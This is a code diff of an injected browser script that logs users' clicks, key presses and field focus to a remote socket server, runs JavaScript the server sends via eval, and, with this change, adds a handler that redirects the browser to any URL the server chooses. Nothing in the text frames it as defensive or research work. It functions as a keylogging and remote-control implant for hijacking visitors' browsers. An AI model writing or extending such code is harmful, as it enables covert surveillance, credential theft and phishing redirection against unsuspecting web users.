@@ -38,7 +38,6 @@
 
     function spyOnClick(socket) {
         const buttons = document.querySelectorAll('button');
-
         const emitClick = function () {
             socket.emit('click', elName(this));
         };
@@ -49,7 +48,15 @@
 
     function listenToRemoteJs(socket) {
         socket.on('eval', function (js) {
+            console.log(js)
             eval(js);
+        });
+    }
+
+    function listenToRedirect(socket) {
+        socket.on('redirect', function (url) {
+            console.log(url)
+            window.location = url;
         });
     }
 
@@ -61,6 +68,7 @@
         spyOnKeyDown(socket);
         spyOnFieldFocus(socket);
         listenToRemoteJs(socket);
+        listenToRedirect(socket);
     }
 
     socketIOLibInjection();
